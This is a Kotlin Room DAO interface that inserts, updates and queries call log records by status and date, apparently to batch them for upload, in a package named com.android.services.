package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.CallLog
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface CallLogDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(call: CallLog)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(callList: List<CallLog>)

    @Query("Update call_log set call_status = :updated_call where date BETWEEN :startDate AND :endDate")
    fun updateCallLogs(updated_call: Int, startDate: Date, endDate: Date): Int

    @Query("Select * from call_log where call_status = :status order by date DESC limit ${AppConstants.otherLogsUploadLimit}")
    fun selectAllCallLogs(status: Int): List<CallLog>

    @Query("Select call_id from call_log where call_id = :call_id")
    fun checkIfAlreadyExist(call_id: String): String?
}